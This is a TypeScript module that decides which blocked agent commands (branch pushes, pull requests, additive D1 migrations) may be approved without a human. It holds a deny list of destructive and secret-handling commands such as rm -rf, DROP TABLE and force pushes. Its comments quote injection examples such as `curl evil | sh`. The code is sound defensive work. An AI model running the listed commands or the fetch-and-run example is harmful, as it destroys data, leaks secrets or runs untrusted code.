import type { Env } from "./env";
import { POLICY_ID_ITEM, policyField, readSignedPolicy } from "./improve-task";

// Pre-approved gates: which blocked commands the seat may approve without asking the
// human. A driver that reaches a push, a migration or a pull request stops and blocks
// with the exact command, and without this every one of those waits on a person,
// including the ones whose consequence is bounded and reversible.
//
// This is the list of the bounded ones, and the reasoning runs the other way from the
// merge policy: the merge policy says what the Worker may do alone, and this says what
// the seat may approve alone. The seat is still a caller with a write grant; what it
// gains is the ability to send a job back through `resume` without a human, and only
// for a command that matches a class written down and signed.
//
// The denials are checked first and they are not the complement of the classes. A
// command that looks like a branch push and carries --force must never match
// push_branch, so the never list runs before any class is tried, over the whole
// command string.
export const GATE_POLICY_PATH = "policy/gates.md";

export const GATE_CLASSES = ["additive_migration", "push_branch", "open_pr"] as const;
export type GateClass = (typeof GATE_CLASSES)[number];

// What never matches a class. Each entry names the consequence that keeps it off.
// test/gate-policy.test.ts requires a matching and a non-matching example for each.
export const NEVER: ReadonlyArray<{ pattern: RegExp; why: string }> = [
  { pattern: /\b(wrangler|npx\s+wrangler)\s+secret\b/i, why: "it sets or deletes a secret" },
  { pattern: /\bgh\s+secret\b/i, why: "it sets or deletes a repository secret" },
  { pattern: /\bsecret\s+(put|delete|bulk)\b/i, why: "it sets or deletes a secret" },
  { pattern: /\brevoke\b/i, why: "it revokes a credential" },
  { pattern: /--force\b|--force-with-lease\b|(^|\s)-f(\s|$)/i, why: "it force-pushes, which rewrites history somebody else may hold" },
  { pattern: /\bpush\s+[^\n;&|]*\+refs\//i, why: "it force-updates a ref" },
  { pattern: /\b(wrangler|npx\s+wrangler)\s+deploy\b/i, why: "it deploys" },
  { pattern: /\b(wrangler|npx\s+wrangler)\s+rollback\b/i, why: "it changes what is deployed" },
  { pattern: /\bwrangler\.jsonc?\b/i, why: "it edits deployment configuration" },
  { pattern: /\bimprove_mode\b|\bimprove_run\b/i, why: "it changes the loop's mode" },
  { pattern: /\bdrop\s+(table|index|column)\b/i, why: "it drops a database object" },
  { pattern: /\bdelete\s+from\b/i, why: "it deletes rows" },
  { pattern: /\btruncate\b/i, why: "it empties a table" },
  { pattern: /\brm\s+-rf?\b/i, why: "it deletes files recursively" },
  { pattern: /\bgh\s+pr\s+merge\b/i, why: "it merges a pull request, which is the human's gate" },
  // The span stops at a shell separator, so `git push -u origin feat/x && gh pr
  // create --base master` is not read as a push to a default branch. That is the shape
  // blocked jobs carry, so the false positive would refuse the ordinary case, while a
  // `master` in the push's own segment still matches.
  //
  // The `-C <path>` form is matched here too. push_branch accepts it, so a never list
  // that only read `git push` would let `git -C <path> push origin master` through the
  // one check that exists to stop it.
  { pattern: /\bgit\s+(?:-C\s+\S+\s+)?push[^\n;&|]*\b(master|main)\b/i, why: "it pushes to a default branch" },
];

export function deniedReason(command: string): string | null {
  for (const { pattern, why } of NEVER) {
    if (pattern.test(command)) return why;
  }
  return null;
}

// The three classes. Each matches a narrow shape, because a loose matcher on this list
// is a widening nobody reviewed.
//
// `git -C <path> push ...` is the same class, and a bare `cd <path>; git push ...` is
// still refused (see classifySegment). The difference is what the directory reaches. A
// `cd` is its own segment and moves every segment after it, so approving one would
// approve a push, a pull request and anything else that follows, in a folder this
// policy cannot tie to the job's repository. `-C` binds the directory to one git
// invocation, and the segment is still wholly a branch push: the never list rules out
// master, main and every force spelling whatever folder it runs in. Without this form a
// driver has no command that both names its directory and classifies.
//
// The path is a narrow character class rather than `\S+`: `*` and `?` are glob
// characters, and a path carrying one would be decided by the shell when the command
// ran rather than by what this matched.
const REPO_PATH = /(?:-C\s+(?:"[A-Za-z0-9._~:\\/ -]+"|'[A-Za-z0-9._~:\\/ -]+'|[A-Za-z0-9._~:\\/-]+)\s+)?/;
const PUSH_BRANCH = new RegExp(
  `^git\\s+${REPO_PATH.source}push\\s+(-u\\s+|--set-upstream\\s+)?origin\\s+[A-Za-z0-9._/-]+\\s*$`,
  "i"
);
const OPEN_PR = /^gh\s+pr\s+create\b/i;
// Anchored at both ends, like PUSH_BRANCH. An unanchored search would let extra
// arguments in the same segment (a second --file, another database name, a --command)
// ride along with the one file that was checked. The segment is exactly: wrangler d1
// execute, one database name, at most one of --remote or --local on either side of
// the file, and one --file under a plain path.
const MIGRATION_FILE = String.raw`--file(?:=|\s+)("[A-Za-z0-9._/-]+"|'[A-Za-z0-9._/-]+'|[A-Za-z0-9._/-]+)`;
const MIGRATION_TARGET = String.raw`--(?:remote|local)`;
const MIGRATION = new RegExp(
  String.raw`^(?:npx\s+)?wrangler\s+d1\s+execute\s+[A-Za-z0-9_-]+\s+(?:${MIGRATION_TARGET}\s+${MIGRATION_FILE}|${MIGRATION_FILE}(?:\s+${MIGRATION_TARGET})?)\s*$`,
  "i"
);

export type GateMatch =
  // Every segment's class, in order, and every migration file the command runs. A
  // plural, because a blocked command is routinely two things: the push and the pull
  // request that follows it.
  | { klasses: GateClass[]; migrationPaths: string[] }
  | { refused: string };

// The never list matches commands, not prose. Run over the raw string, it would refuse
// a pull request titled "Add improve_run action register_skill" as a change to the
// loop's mode. So quoted arguments are removed from `gh pr create` pieces before the
// list runs, and from nothing else: a quoted `--command "DROP TABLE jobs"` on a
// `d1 execute` piece is a command, and a quoted branch name on a push is still the
// branch being pushed.
//
// Removing quoted text is only safe if the quoted text is inert. Bash and PowerShell
// both expand `$` and run command substitution inside double quotes, and PowerShell
// evaluates a parenthesised argument, so `gh pr create --title "$(curl ...)"` would
// otherwise classify as open_pr. The characters that make a shell evaluate something
// are refused anywhere in the command, before anything is removed.

// Anywhere in the command, quoted or not.
const EXPANDS = /[$`]/;
// Outside quotes only: a subexpression, a script block, or a redirect.
const UNQUOTED_ACTIVE = /[(){}<>]/;
const OPEN_PR_PIECE = /^gh\s+pr\s+create\b/i;
const SEPARATORS = ["&&", "||", ";", "|", "&", "\n"];

/**
 * The command's pieces, split on shell separators that are not inside quotes. The one
 * splitter both the never list and classifyCommand read, so they cannot disagree. A
 * second splitter that knew nothing about quotes would cut a `gh pr create --body` in
 * half at a semicolon in its prose and refuse the whole command; a pull request body
 * is prose and will contain semicolons, ampersands and pipes.
 *
 * Not a shell parser. The dangerous error is missing a separator, which would hide a
 * second command in an approved segment; a separator inside quotes is not one to the
 * shell either. A lone `&` counts: bash runs what follows as a second command, and
 * PowerShell treats it as the call operator.
 */
function commandPieces(command: string): { pieces: Array<{ raw: string; bare: string }> } | { refused: string } {
  if (EXPANDS.test(command)) {
    return {
      refused:
        "it contains a $ or a backtick, which bash and PowerShell expand even inside double quotes, so part of the command would be decided when it runs. It waits for the human.",
    };
  }

  // Each piece keeps its text with and without its quoted spans.
  const pieces: Array<{ raw: string; bare: string }> = [];
  let raw = "";
  let bare = "";
  let quote: "'" | '"' | null = null;
  let span = "";
  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (quote) {
      span += ch;
      if (ch === quote) {
        raw += span;
        // Ends at the first matching quote. Neither shell ends one earlier; a bash `\"`
        // or PowerShell `""` only makes it run on, and that text is then read as unquoted.
        bare += quote + quote;
        quote = null;
        span = "";
      }
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      span = ch;
      continue;
    }
    const separator = SEPARATORS.find((s) => command.startsWith(s, i));
    if (separator) {
      pieces.push({ raw, bare });
      raw = "";
      bare = "";
      i += separator.length - 1;
      continue;
    }
    if (UNQUOTED_ACTIVE.test(ch)) {
      return {
        refused: `it contains '${ch}' outside quotes, which is a subexpression, a script block or a redirect in bash or PowerShell. It waits for the human.`,
      };
    }
    raw += ch;
    bare += ch;
  }
  if (quote) return { refused: "it has a quote that never closes, so where its commands end cannot be read. It waits for the human." };
  pieces.push({ raw, bare });
  return { pieces };
}

/** The command as the never list reads it, or why it cannot be read safely. */
function neverListView(command: string): { view: string } | { refused: string } {
  const split = commandPieces(command);
  if ("refused" in split) return split;

  const view = split.pieces
    .map(({ raw: text, bare: stripped }) => (OPEN_PR_PIECE.test(text.trim()) ? stripped : text))
    .map((text) => text.trim())
    .filter(Boolean)
    .join(" ; ");
  return { view };
}

/** The class one segment falls into, or why it falls into none. */
function classifySegment(segment: string): { klass: GateClass; migrationPath?: string } | { refused: string } {
  const migration = MIGRATION.exec(segment);
  if (migration) {
    // Group 1 or 2, by which side of the file the --remote or --local sits.
    const path = (migration[1] ?? migration[2]).replace(/^["']|["']$/g, "");
    if (!/(^|\/)migrations\//i.test(path)) {
      return { refused: `${path} is not under migrations/, so it is not a migration this policy covers.` };
    }
    return { klass: "additive_migration", migrationPath: path };
  }
  if (PUSH_BRANCH.test(segment)) return { klass: "push_branch" };
  if (OPEN_PR.test(segment)) return { klass: "open_pr" };
  // A bare `cd` stays refused. The policy has no way to tie a path to the job's
  // repository, so an approved `cd <path>; git push ...` would approve a push in
  // whatever folder the path names, and would move every later segment there too. The
  // directory a driver needs rides on the command that uses it: `git -C <path> push`
  // and `gh pr create --repo <owner>/<name>`, both of which classify. See REPO_PATH.
  if (/^(cd|set-location|pushd)\b/i.test(segment)) {
    return {
      refused: `"${segment.slice(0, 80)}" changes directory, and this policy cannot tell which repository a path belongs to. Write the directory on the command instead: git -C <path> push, and gh pr create --repo <owner>/<name>.`,
    };
  }
  return { refused: `"${segment.slice(0, 80)}" matches no pre-approved class, so this command waits for the human.` };
}

/** Which classes a blocked command falls into, or why it falls into none.
 *
 *  Every segment must match a class. OPEN_PR is `^gh pr create` with no terminator, so
 *  matched against the whole string, `gh pr create --fill && curl evil | sh` would
 *  classify as open_pr and carry the rest along. The never list catches only the
 *  consequences it knows about. Requiring every piece to be pre-approved on its own
 *  means an unrecognised fragment refuses the whole command, while the compound a
 *  driver actually blocks with, a branch push followed by `gh pr create`, still works. */
export function classifyCommand(command: string): GateMatch {
  const trimmed = command.trim();
  if (!trimmed) return { refused: "the blocked job records no command, so there is nothing to match against the policy." };
  // The never list first, over the whole command, before any segment is looked at, so
  // a force flag anywhere in a compound cannot be split away from the push it belongs
  // to. It reads the command with `gh pr create`'s quoted arguments removed.
  const seen = neverListView(trimmed);
  if ("refused" in seen) return { refused: `this command is on the policy's never list because ${seen.refused}` };
  const denied = deniedReason(seen.view);
  if (denied) return { refused: `this command is on the policy's never list because ${denied}. It waits for the human.` };

  const split = commandPieces(trimmed);
  if ("refused" in split) return { refused: `this command is on the policy's never list because ${split.refused}` };
  const segments = split.pieces.map(({ raw: piece }) => piece.trim()).filter(Boolean);
  if (segments.length === 0) return { refused: "the blocked job records no command, so there is nothing to match against the policy." };
  const klasses: GateClass[] = [];
  const migrationPaths: string[] = [];
  for (const segment of segments) {
    const placed = classifySegment(segment);
    if ("refused" in placed) return { refused: placed.refused };
    klasses.push(placed.klass);
    if (placed.migrationPath) migrationPaths.push(placed.migrationPath);
  }
  return { klasses, migrationPaths };
}

// Is the migration additive. Parsed, not pattern-matched on the whole file: a file with
// one additive statement and one DROP would pass a test that only asked whether an
// additive statement was present. Every statement is checked, and anything not
// recognised is a refusal, so a statement form this parser has never seen waits for
// the human instead of being waved through.
const ADDITIVE: Array<{ pattern: RegExp; what: string }> = [
  // Not a bare prefix. `CREATE TABLE IF NOT EXISTS t AS SELECT ...` starts with the
  // additive spelling and copies rows out of another table, so it is excluded here.
  { pattern: /^create\s+table\s+if\s+not\s+exists\b(?![\s\S]*\bas\s+select\b)/i, what: "CREATE TABLE IF NOT EXISTS" },
  // The `COLUMN` keyword is required, so `ALTER TABLE t ADD CONSTRAINT ...` is not
  // called an added column. SQLite accepts the keyword and the policy document names
  // it, so demanding it costs a migration author one word.
  { pattern: /^alter\s+table\s+\S+\s+add\s+column\b/i, what: "ALTER TABLE ADD COLUMN" },
  { pattern: /^create\s+(unique\s+)?index\s+(if\s+not\s+exists\s+)?/i, what: "CREATE INDEX" },
];

export function splitStatements(sql: string): string[] {
  // Comments first, so a DROP inside a comment is not read as a statement and a
  // semicolon inside one does not split.
  const withoutComments = sql.replace(/--[^\n]*/g, "").replace(/\/\*[\s\S]*?\*\//g, "");
  return withoutComments
    .split(";")
    .map((s) => s.trim())
    .filter(Boolean);
}

export function isAdditiveMigration(sql: string): { ok: true; statements: string[] } | { ok: false; reason: string } {
  const statements = splitStatements(sql);
  if (statements.length === 0) return { ok: false, reason: "the migration file contains no statements." };
  const kinds: string[] = [];
  for (const statement of statements) {
    const match = ADDITIVE.find(({ pattern }) => pattern.test(statement));
    if (!match) {
      return {
        ok: false,
        reason: `the migration contains a statement this policy does not call additive: "${statement.slice(0, 80)}". Only CREATE TABLE IF NOT EXISTS, ALTER TABLE ADD COLUMN and CREATE INDEX are pre-approved.`,
      };
    }
    kinds.push(match.what);
  }
  return { ok: true, statements: kinds };
}

export interface GatePolicy {
  version: string;
  enabled: boolean;
  classes: string[];
}

export function parseGatePolicy(body: string): { policy: GatePolicy } | { error: string } {
  const version = policyField(body, "version");
  if (!version) return { error: "the gate policy names no version, so an approval against it cannot be traced to what it allowed." };
  const enabled = policyField(body, "enabled");
  if (enabled === null) return { error: "the gate policy does not say whether it is enabled." };
  const classes: string[] = [];
  for (const line of body.split("\n")) {
    const match = POLICY_ID_ITEM.exec(line.trim());
    if (match) classes.push(match[1]);
  }
  return { policy: { version, enabled: enabled.toLowerCase() === "true", classes } };
}

export async function loadGatePolicy(env: Env): Promise<{ policy: GatePolicy } | { error: string }> {
  const read = await readSignedPolicy(env, GATE_POLICY_PATH, "gate policy", "nothing is pre-approved");
  if ("error" in read) return read;
  const parsed = parseGatePolicy(read.body);
  if ("error" in parsed) return parsed;
  const missing = GATE_CLASSES.filter((c) => !parsed.policy.classes.includes(c));
  if (missing.length > 0) {
    return {
      error: `the gate policy does not name ${missing.join(", ")}, which this Worker would approve. Refusing rather than approving against a policy that describes less than the code does.`,
    };
  }
  return parsed;
}

export type ApprovalVerdict =
  // `klass` is every class that matched, joined with "+", because a compound command
  // is routinely two of them and an audit row naming only the first describes less
  // than was approved. `klasses` keeps the structured form.
  | { approved: true; klass: string; klasses: GateClass[]; detail: string; policyVersion: string }
  | { approved: false; reason: string };

/**
 * Whether the seat may send this blocked command back in on the policy alone.
 * `readMigration` is passed in so the caller owns the repo read and this stays
 * testable without a GitHub fake. It returns the file, null when there is none, or
 * throws with the reason it could not be read.
 */
export async function approveByPolicy(
  env: Env,
  requestedVersion: string,
  command: string | null,
  readMigration: (path: string) => Promise<string | null>
): Promise<ApprovalVerdict> {
  const loaded = await loadGatePolicy(env);
  if ("error" in loaded) return { approved: false, reason: loaded.error };
  const policy = loaded.policy;
  if (!policy.enabled) {
    return { approved: false, reason: `gate policy ${policy.version} is present and disabled, so nothing is pre-approved.` };
  }
  if (requestedVersion !== policy.version) {
    return {
      approved: false,
      reason: `this approval names policy version '${requestedVersion}' and the stored policy is version '${policy.version}'. Re-read the policy before approving against it.`,
    };
  }
  if (!command) {
    return { approved: false, reason: "this blocked job records no command, so there is nothing for the policy to match." };
  }

  const match = classifyCommand(command);
  if ("refused" in match) return { approved: false, reason: match.refused };

  // Every migration the command runs is parsed, not just the first, or a compound
  // naming two files would have one of them checked.
  const details: string[] = [];
  for (const path of match.migrationPaths) {
    // A reader that throws says why it could not read, and the refusal carries that.
    let sql: string | null;
    try {
      sql = await readMigration(path);
    } catch (err) {
      return {
        approved: false,
        reason: `${path} could not be read (${err instanceof Error ? err.message : String(err)}), so its statements could not be checked. A migration nobody parsed is not pre-approved.`,
      };
    }
    if (sql === null) {
      return { approved: false, reason: `${path} could not be read, so its statements could not be checked. A migration nobody parsed is not pre-approved.` };
    }
    const additive = isAdditiveMigration(sql);
    if (!additive.ok) return { approved: false, reason: additive.reason };
    details.push(`${path}: ${additive.statements.join(", ")}`);
  }

  return {
    approved: true,
    klass: match.klasses.join("+"),
    klasses: match.klasses,
    detail: details.length > 0 ? details.join("; ") : command.trim(),
    policyVersion: policy.version,
  };
}
